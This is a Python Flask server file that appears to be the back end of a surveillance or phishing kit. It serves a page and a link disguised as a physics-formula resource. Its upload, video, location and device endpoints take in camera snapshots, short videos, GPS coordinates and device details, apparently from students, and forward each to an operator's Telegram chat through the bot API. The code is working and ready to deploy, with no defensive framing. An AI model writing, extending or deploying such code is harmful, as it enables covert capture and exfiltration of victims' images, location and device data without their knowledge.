import os
import requests
from flask import Flask, send_file, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
RENDER_URL = os.environ.get("RENDER_URL")

current_video_url = "https://munna1127.github.io/Physical-formula/physical--formula.html"


@app.route("/")
def home():
    return send_file("index.html")


@app.route("/get_video_link")
def get_video_link():
    return jsonify({"url": current_video_url})


# 📸 SNAPSHOT
@app.route("/upload", methods=["POST"])
def upload():

    if "photo" in request.files:

        photo = request.files["photo"]
        temp = "temp.jpg"
        photo.save(temp)

        with open(temp, "rb") as f:

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                files={"photo": f},
                data={
                    "chat_id": CHAT_ID,
                    "caption": "📸 Student Snapshot"
                }
            )

        os.remove(temp)

    return "OK"


# 🎥 VIDEO
@app.route("/video", methods=["POST"])
def video():

    if "video" in request.files:

        video = request.files["video"]
        temp = "temp.webm"
        video.save(temp)

        with open(temp, "rb") as f:

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                files={"video": f},
                data={
                    "chat_id": CHAT_ID,
                    "caption": "🎥 Student Video (5 sec)"
                }
            )

        os.remove(temp)

    return "OK"


# 📍 LOCATION
@app.route("/location", methods=["POST"])
def location():

    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
        data={
            "chat_id": CHAT_ID,
            "latitude": lat,
            "longitude": lon
        }
    )

    return "OK"


# 📱 DEVICE INFO
@app.route("/device", methods=["POST"])
def device():

    data = request.json

    text = f"""
📱 Device Info

Device : {data.get("device")}
OS : {data.get("os")}
Browser : {data.get("browser")}
Screen : {data.get("screen")}
"""

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": CHAT_ID, "text": text}
    )

    return "OK"


if __name__ == "__main__":

    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 8080))
)
